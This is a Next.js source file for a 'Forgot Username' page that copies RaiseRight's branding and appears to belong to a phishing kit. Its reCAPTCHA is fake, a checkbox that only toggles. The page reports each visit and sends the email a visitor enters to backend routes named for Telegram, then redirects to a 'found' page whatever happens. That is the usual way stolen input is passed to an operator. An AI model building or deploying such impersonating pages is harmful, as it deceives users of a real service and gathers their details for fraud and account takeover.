"use client";

import { FormEvent, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";

export default function ForgotIdPage() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [captchaCompleted, setCaptchaCompleted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const hasNotifiedView = useRef(false);

  const isFormValid = email.trim().length > 0 && captchaCompleted;

  useEffect(() => {
    if (hasNotifiedView.current) return;
    hasNotifiedView.current = true;
    fetch("/api/telegram/forgot-password-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email.trim() }),
      }).catch(console.error);
    } catch (err) {
      console.error("Forgot username notification error:", err);
    } finally {
      setIsLoading(false);
    }
    await new Promise((r) => setTimeout(r, 1500));
    router.push("/forgot-password-found");
  };

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#294d73]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="w-full">
        <section className="mx-auto w-full max-w-3xl px-6 pb-16 pt-16 sm:px-8 sm:pt-20 md:px-10 md:pt-20">
          <h1 className="text-5xl font-semibold tracking-tight text-[#294d73] sm:text-3xl">
            Forgot Username
          </h1>

          <p className="mt-4 text-xl leading-relaxed text-gray-600">
            Enter your email address so we can send you your username.
          </p>

          <form onSubmit={handleSubmit}>
            {/* Email */}
            <div className="mt-8 bg-gray-50">
              <label
                htmlFor="email"
                className="mb-1 block text-xl font-medium text-[#28577f] px-3"
              >
                Email Address
              </label>
              <input
                id="email"
                type="email"
                placeholder="example@website.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-14 w-full rounded-none border-0 border-b border-[#28577f] px-3 text-lg text-gray-600 outline-none placeholder:text-gray-500 focus:border-[#7db6db] focus:ring-1 focus:ring-[#7db6db] sm:text-lg bg-gray-50"
              />
            </div>

            {/* Validation */}
            <div className="mt-14">
              <p className="text-base text-gray-600">Validation:</p>

              {/* reCAPTCHA Visual */}
              <div className="mt-5 flex w-full max-w-sm items-center justify-between rounded border border-gray-300 bg-white px-4 py-3 shadow-sm sm:px-5">
                <div className="flex min-w-0 items-center gap-3 sm:gap-4">
                  <button
                    type="button"
                    onClick={() => setCaptchaCompleted(!captchaCompleted)}
                    aria-label="I'm not a robot"
                    className="flex h-8 w-8 shrink-0 items-center justify-center border-2 border-gray-500 bg-white"
                  >
                    {captchaCompleted && (
                      <span className="text-xl font-bold text-green-600">
                        ✓
                      </span>
                    )}
                  </button>

                  <div className="min-w-0">
                    <p className="whitespace-nowrap text-sm text-gray-800 sm:text-base">
                      I'm not a robot
                    </p>
                    <p className="text-xs leading-tight text-gray-500">
                      reCAPTCHA is changing its terms of service.
                    </p>
                    <a href="#" className="text-xs text-gray-600 underline">
                      Take action.
                    </a>
                  </div>
                </div>

                <div className="ml-4 flex shrink-0 flex-col items-center">
                  <div className="flex h-10 w-10 items-center justify-center text-3xl text-[#2878c8]">
                    ↻
                  </div>
                  <span className="text-xs text-gray-500">reCAPTCHA</span>
                </div>
              </div>
            </div>

            {/* Continue */}
            <button
              type="submit"
              disabled={!isFormValid || isLoading}
              className={`mt-15 h-14 w-48 rounded-full text-lg font-normal sm:w-52 transition ${
                isFormValid && !isLoading
                  ? "bg-[#0878c9] text-white hover:bg-[#076db7]"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
            >
              {isLoading ? "Loading..." : "Continue"}
            </button>
          </form>
        </section>
      </main>
    </div>
  );
}
